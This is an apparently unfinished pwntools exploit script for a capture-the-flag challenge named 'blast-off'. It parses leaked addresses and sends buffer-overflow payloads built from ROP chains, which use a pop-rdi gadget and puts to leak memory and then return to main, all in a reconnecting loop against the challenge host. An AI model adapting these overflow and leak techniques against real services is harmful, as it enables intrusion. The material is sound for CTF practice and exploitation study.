#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
filename = "./pwn"
if LOCAL:
    io = process(filename)
else:
    io = remote("spaceheroes-blast-off.chals.io", 443, ssl=True, sni="spaceheroes-blast-off.chals.io")


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

padding_len = 0x28
strange1 = 0x400660
strange2 = 0x4006e0
while 1:
    try:
        ru(b'---------------------------------------------------\n')
        ru(b'| PUTS_PLT 0x')
        puts_plt = int(ru(b'      | BROP_GADGET 0x', "drop"), 16)
        brop_gadget = int(ru(b'   |\n', "drop"), 16)
        ru(b'| BLAST_OFF GOT 0x')
        b_off_got = int(ru(b' | MAIN 0x', "drop"), 16)
        main_addr = int(ru(b'          |\n'), 16)

        lg("puts_plt")
        lg("brop_gadget")
        lg("b_off_got")
        lg("main_addr")

        pop_rdi_ret = brop_gadget + 0x9
        pop_rsi_r15_ret = brop_gadget + 0x7
        ru(b'Please enter the launch codes to start: \n')
        payload = b"a"*padding_len# + p64(main_addr)
        payload += p64(pop_rdi_ret) + p64(b_off_got)
        payload += p64(puts_plt)
        payload += p64(main_addr)
        sl(payload)

        libc_base = uu64(rn(6))
        lg("libc_base")

        ru(b'Please enter the launch codes to start: \n')
        payload = b"a"*padding_len# + p64(main_addr)
        payload += p64(pop_rdi_ret) + p64(0x400009)
        payload += p64(puts_plt)
        payload += p64(main_addr)
        sl(payload)

        lg("test")

        ia()
    except Exception as e:
        io.close()
        io = remote("spaceheroes-blast-off.chals.io", 443, ssl=True, sni="spaceheroes-blast-off.chals.io")

